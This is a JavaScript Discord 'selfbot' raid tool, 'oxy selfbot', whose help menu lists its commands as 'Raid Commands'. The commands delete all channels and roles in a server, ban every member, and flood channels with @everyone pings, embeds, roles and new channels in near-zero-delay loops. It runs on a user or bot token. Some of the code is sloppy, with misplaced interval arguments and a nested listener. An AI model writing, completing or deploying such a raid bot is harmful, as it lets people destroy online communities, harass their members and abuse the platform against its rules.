const Discord = require('discord.js')
const bot = new Discord.Client();

bot.on('ready', () => {
    console.log(`${bot.user.tag} is online as oxy selfbot!`)
})

bot.on('message', message => {
    if(message.content === 'x.ping') {
      setInterval(function() {
          message.channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone')
         }),
      1
    }

    if(message.content === "x.nuke") {
 message.channel.send("Nuking")
	 message.guild.channels.forEach(channel => channel.delete())
	 message.guild.roles.forEach(roles => roles.delete()) } 
	  
    if(message.content === 'x.create') {
      setInterval(function() {
      message.guild.createChannel('oxy on the top', 'text')
      message.guild.createChannel('oxy on the top', 'voice')
      message.guild.createChannel('oxy on the top', 'category')
    }),
    1
  }

  if(message.content === 'x.createroles') {
    setInterval(function() {
        message.guild.createRole({
           name: "oxy on the top",
           color: 'RANDOM'
        })
      }),
      1
    }

  if(message.content === 'x.deleteroles') {
    message.guild.roles.forEach(role => role.delete())
  }
  if(message.content === 'x.deletechannels') {	
     message.guild.channels.forEach(channel => channel.delete())
  }
  if(message.content === 'x.banall') {
    message.guild.members.forEach((f) => {
      message.guild.member(f).ban('oxy on the top')
    })
  }

  bot.on('message', message => {
if(message.content === 'x.spam') {
	setInterval(function() {
  const spam = new Discord.RichEmbed()
  .setTitle("oxy on the top")
  .addField('oxy on the top', 'oxy on the top', true)
  .setColor("RANDOM")
  message.channel.send(spam)
  }),
      1
    }
})

  if(message.content === 'x.help') {
  const xhelp = new Discord.RichEmbed()
  .setTitle("ALL COMMANDS")
  .addField('Info Commands', '```x.info```', true)
  .addField('Raid Commands', '```x.nuke, x.createroles, x.deleteroles, x.create, x.deletechannels, x.banall```', true)
  .addField('Other Commands', '```x.ping```', true)
  .setFooter("Thank you for using OxyBrain")
  .setColor("RANDOM")
  message.channel.send(xhelp)
  }
  if(message.content === 'x.info') {
  const xinfo = new Discord.RichEmbed()
  .setTitle("Informations")
  .setDescription("**The bot was created 2021 by YCG (YungCraig01), Thanks for using oxy selfbot!**")
  .setFooter("Thank you for using OxyBrain")
  .setColor("RANDOM")
  message.channel.send(xinfo)
  }
}) 
       
bot.login('') //here put token (user or bot)

